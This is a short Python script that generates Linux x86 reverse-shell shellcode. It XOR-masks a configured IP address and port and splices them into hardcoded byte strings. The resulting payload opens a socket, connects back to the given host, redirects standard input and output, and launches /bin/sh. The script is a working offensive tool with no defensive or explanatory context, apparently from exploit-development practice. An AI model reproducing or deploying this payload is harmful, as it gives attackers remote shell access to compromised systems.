#!/usr/bin/python

from operator import xor


# set ip and port
ip = "192.168.1.12"
#port = "31337"
#ip = '127.0.0.1'
port = '8888'


ip_in_xored_bytes = ''
port_in_xored_bytes = ''


shell_code_1 = "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc6\\xb8\\xff\\xff\\xff\\xff\\x52\\x52\\x35"

#ip

shell_code_2 = "\\x50\\xb8\\xff\\xff\\xff\\xff\\x66\\x35"

#port

shell_code_3 = "\\x66\\x50\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x89\\xf3\\x31\\xc0\\x66\\xb8\\x6a\\x01\\xcd\\x80\\x85\\xc0\\x75\\x27\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\xfe\\xc9\\xcd\\x80\\x75\\xf8\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x55\\x89\\xe1\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x31\\xdb\\xb0\\x01\\xb3\\x07\\xcd\\x80"

for byte in ip.split("."):
        ip_in_xored_bytes += "\\x" + "{:x}".format(xor(int(byte),0xff))


port_in_xored_bytes += "{:04x}".format(xor(int(port),0xffff))
port_xored_formated = "\\x" + port_in_xored_bytes[:2] + "\\x" + port_in_xored_bytes[2:]

print "ip:", ip
print "xored ip: ", ip_in_xored_bytes
print "port:", port
print "xored port: ", port_xored_formated
print ""
shell_code = shell_code_1 + ip_in_xored_bytes + shell_code_2 + port_xored_formated + shell_code_3
print "ShellCode:"
print shell_code

